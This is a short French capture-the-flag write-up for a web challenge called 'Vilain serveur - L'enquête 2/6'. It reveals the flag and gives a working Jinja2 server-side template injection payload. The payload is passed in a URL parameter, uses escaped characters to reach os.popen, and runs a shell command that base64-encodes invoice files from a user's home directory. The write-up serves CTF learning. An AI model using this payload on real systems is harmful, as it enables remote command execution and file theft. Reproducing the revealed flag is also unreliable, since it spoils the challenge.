# Vilain serveur - L'enquête 2/6

| Enquête (Web) |
|---------------|
| Moyen 🙂      | 
| Validé ✅      |

## Description

- 22 Octobre 2024

Eh beh Michel, ça c'est du bon boulot !

Bon, pour le moment son site nous apprend pas grand chose.

Essaie de voir si tu peux pas trouver des documents intéressants dessus.

- Auteur : NozZy

## Flag
||`CYBN{c0Mm4nd3_pLu707_1nQu13t4N73}`||

## Pistes
SSTI dans URL param, base64 Invoice dans documents
```py
{%with%20a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimport\x5f\x5f%27)(%27os%27)|attr(%27popen%27)(%27base64%20/home/texas/Documents/Invoice*%27)|attr(%27read%27)()%}{%print(a)%}{%endwith%}
```
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#without-several-chars
